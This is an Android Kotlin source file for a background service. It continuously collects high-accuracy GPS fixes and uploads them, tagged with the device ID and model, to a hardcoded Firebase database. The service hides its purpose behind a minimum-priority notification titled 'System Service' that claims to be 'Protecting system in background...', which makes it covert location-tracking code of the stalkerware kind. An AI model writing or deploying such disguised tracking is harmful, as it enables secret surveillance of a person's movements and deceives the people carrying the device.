package app.gpslocation.id.services

import android.app.*
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.google.firebase.database.FirebaseDatabase

class LocationTrackingService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val db = FirebaseDatabase.getInstance("https://gps-locator-956fb-default-rtdb.asia-southeast1.firebasedatabase.app").reference
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"

    override fun onCreate() {
        super.onCreate()
        Log.d("GPS_TRACKER", "Service Created for $deviceName")
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { 
                    Log.d("GPS_TRACKER", "Location received: ${it.latitude}, ${it.longitude}")
                    uploadLocation(it) 
                }
            }
        }
        
        // Simpan info perangkat sekali saat service dibuat
        db.child("devices").child(deviceId).child("info").child("name").setValue(deviceName)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("GPS_TRACKER", "Service Started")
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, "location_channel")
            .setContentTitle("System Service")
            .setContentText("Protecting system in background...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        
        startForeground(1, notification)
        requestLocationUpdates()
        
        return START_STICKY
    }

    private fun requestLocationUpdates() {
        // Interval 5 menit (300.000 ms), Min Jarak 50 meter
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 300000)
            .setMinUpdateIntervalMillis(150000)
            .setMinUpdateDistanceMeters(50f)
            .build()

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
            Log.d("GPS_TRACKER", "Location updates requested (5m, 50m filter)")
        } catch (e: SecurityException) {
            Log.e("GPS_TRACKER", "Permission error: ${e.message}")
        }
    }

    private fun uploadLocation(location: Location) {
        val data = hashMapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "timestamp" to System.currentTimeMillis(),
            "accuracy" to location.accuracy
        )
        
        db.child("devices").child(deviceId).child("locations").push().setValue(data)
            .addOnSuccessListener { Log.d("GPS_TRACKER", "Location uploaded to RDB") }
            .addOnFailureListener { Log.e("GPS_TRACKER", "Upload failed: ${it.message}") }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "location_channel",
            "System Protection",
            NotificationManager.IMPORTANCE_MIN
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d("GPS_TRACKER", "Service Destroyed")
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }
}